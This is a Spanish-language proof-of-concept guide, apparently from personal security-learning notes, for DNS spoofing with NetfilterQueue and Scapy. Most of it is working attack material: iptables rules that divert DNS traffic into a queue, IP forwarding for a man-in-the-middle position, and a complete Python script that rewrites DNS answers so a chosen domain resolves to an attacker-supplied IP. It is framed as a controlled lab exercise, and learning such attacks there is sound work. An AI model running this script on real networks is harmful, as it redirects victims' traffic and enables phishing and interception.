
---

# PoC — netfilterqueue (DNS spoofing, integración con Scapy)

---

## Resumen

Documento PoC que muestra cómo usar `netfilterqueue` junto con **Scapy** para inspeccionar y modificar tráfico DNS (DNS spoofing) en un laboratorio controlado. Este fichero está pensado para relacionarse directamente con la documentación ubicada en `Lenguajes/Python/Utilidades Ofensivas/` (por ejemplo, el documento de "Evolución del Script de DNS Spoofing").

[Ver tutorial sobre DNS_spoofing.py](../../../Utilidades%20Ofensivas/DNS%20Spoofing/dns_spoofing_tutorial.md)

---

## Requisitos

- Linux (Debian/Ubuntu recomendado) con `iptables` o `nftables` gestionando Netfilter.
    
- Python 3.8+ y paquetes: `scapy`, `netfilterqueue` (nota: el paquete del sistema suele llamarse `python3-netfilterqueue` o `NetfilterQueue` en pip). Instalar con:
    

```bash
python3 -m venv venv
source venv/bin/activate
pip install scapy
pip install NetfilterQueue
# Alternativa en Debian/Ubuntu:
# sudo apt install python3-netfilterqueue
```

- Permisos de root para manipular reglas iptables y raw sockets.
    
---

## Reglas iptables de ejemplo (entorno de laboratorio)

Redirige paquetes UDP/53 a la cola 0 para que `netfilterqueue` los reciba.

```bash
# Guardar reglas actuales (importante)
sudo iptables-save > /tmp/iptables.before

# Enrutamiento de DNS UDP a NFQUEUE 0
sudo iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0
# Si la prueba la haces en la misma máquina (MITM con forwarding), usa:
# sudo iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0
# sudo iptables -I INPUT  -p udp --dport 53 -j NFQUEUE --queue-num 0
```

Al terminar las pruebas, restaura reglas:

```bash
sudo iptables-restore < /tmp/iptables.before
```

---

## Script PoC (netfilterqueue + Scapy) — `dns_spoof_nfqueue.py`


```python
#!/usr/bin/env python3
"""dns_spoof_nfqueue.py
PoC mínimo de DNS spoofing usando NetfilterQueue + Scapy.
Uso: sudo python3 dns_spoof_nfqueue.py --target-ip 192.168.1.110 --domain example.com
"""
import argparse
import signal
import sys

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

# Ctrl+C handler
def def_handler(sig, frame):
    print('\n[!] Saliendo y restaurando estado...')
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

# Función que procesa paquetes
def process_packet(packet, target_domain, fake_ip):
    scapy_packet = scapy.IP(packet.get_payload())

    # Solo trabajamos con paquetes DNS (consulta o respuesta)
    if scapy_packet.haslayer(scapy.DNSQR):
        qname = scapy_packet[scapy.DNSQR].qname
        # Filtrar por dominio objetivo (bytes)
        if target_domain.encode() in qname:
            print(f"[+] Detected DNS query for {qname.decode()}")

            # Si es una consulta, construir respuesta falsa
            if scapy_packet.haslayer(scapy.UDP):
                # Crear respuesta DNS
                answer = scapy.DNSRR(rrname=qname, rdata=fake_ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Borrar campos para que Scapy los regenere
                try:
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].len
                    del scapy_packet[scapy.UDP].chksum
                except Exception:
                    pass

                # Inyectar el paquete modificado
                packet.set_payload(bytes(scapy_packet))
                print(f"[+] Spoofed {qname.decode()} -> {fake_ip}")

    packet.accept()


def main():
    parser = argparse.ArgumentParser(description='PoC DNS spoofing via NFQUEUE + Scapy')
    parser.add_argument('--target-ip', required=True, help='IP donde redirigir el dominio objetivo (fake IP)')
    parser.add_argument('--domain', required=True, help='Dominio objetivo a envenenar (ej. example.com)')
    parser.add_argument('--queue-num', default=0, type=int, help='Número de NFQUEUE (default: 0)')
    args = parser.parse_args()

    nfqueue = NetfilterQueue()
    print(f"[i] Bind to NFQUEUE {args.queue_num} — spoofing {args.domain} -> {args.target_ip}")

    # Bind con una función parcial que cierre sobre los argumentos
    nfqueue.bind(args.queue_num, lambda pkt: process_packet(pkt, args.domain, args.target_ip))

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('\n[!] Detenido por usuario')
    finally:
        nfqueue.unbind()


if __name__ == '__main__':
    main()
```

---

## Diagnóstico y pruebas

1. Habilita ip forwarding si usas MITM:
    

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

2. Inserta las reglas iptables para enviar UDP/53 a NFQUEUE (ver sección más arriba).
    
3. Arranca el PoC: `sudo python3 dns_spoof_nfqueue.py --target-ip <IP_objetivo> --domain <dominio/web>`
    
4. Desde una máquina víctima, realiza una consulta DNS al dominio objetivo y observa en el PoC las detecciones y el resultado final.
    
---

## Buenas prácticas y seguridad

- Asegúrate de limpiar las reglas de iptables y desactivar ip_forward tras las pruebas.
    
- Documenta la configuración de red (modo bridge/NAT/host-only) para reproducibilidad.
    
- Añade logs y opciones de verbose/quiet al script si lo vas a usar en ejercicios más largos.

---
